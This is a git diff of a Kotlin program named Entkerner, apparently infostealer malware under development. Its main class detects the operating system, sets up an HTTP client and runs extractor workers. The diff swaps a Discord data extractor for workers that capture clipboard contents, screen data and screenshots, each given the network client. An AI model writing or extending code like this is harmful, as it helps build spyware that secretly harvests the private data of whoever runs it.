@@ -20,6 +20,7 @@ import net.kerner.entkerner.extractors.standart.ClipboardExtractionWorker
 import net.kerner.entkerner.model.SystemType
 import java.awt.image.BufferedImage
 import java.io.File
+import kotlin.io.path.pathString
 
 class Entkerner {
     val system = when(System.getProperty("os.name").lowercase()) {
@@ -28,8 +29,7 @@ class Entkerner {
         "xnu" -> SystemType.XNU // probably not working, need to test each of these
         else -> SystemType.WINDOWS // most common used on desktop
     }
-    val extractors = listOf(::DiscordDataWorker)
-    val httpClient = HttpClient(CIO) {
+    private val httpClient = HttpClient(CIO) {
         install(ContentNegotiation) {
             json(Json {
                 ignoreUnknownKeys = true
@@ -42,17 +42,17 @@ class Entkerner {
     }
     init {
         runBlocking {
-            val screenshot = DiscordDataWorker(httpClient, this@Entkerner)
-            runExtractor(screenshot as AbstractDataExtractor<Any, DiscordData>)
+            val clipboard = runExtractor<String>(ClipboardExtractionWorker(httpClient) as AbstractDataExtractor<Any>)
+            val screenData = runExtractor<List<ScreenData>>(ScreenExtractionWorker(httpClient) as AbstractDataExtractor<Any>)
+            val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient) as AbstractDataExtractor<Any>)
         }
     }
-    private suspend inline fun <reified V> runExtractor(dataExtractor: AbstractDataExtractor<Any, V>): Boolean {
+    private suspend inline fun <reified V> runExtractor(dataExtractor: AbstractDataExtractor<Any>): V {
         val file = dataExtractor.fileDirectories[system].toFile()
-        if (!file.exists()) return false
         val resultT = dataExtractor.extractData(file)
-        val resultV = dataExtractor.handleExtractedData(resultT)
+        val resultV = dataExtractor.handleExtractedData<V>(resultT)
         println(Json.encodeToString(resultV as V))
-        return true
+        return resultV as V
     }
 }
 
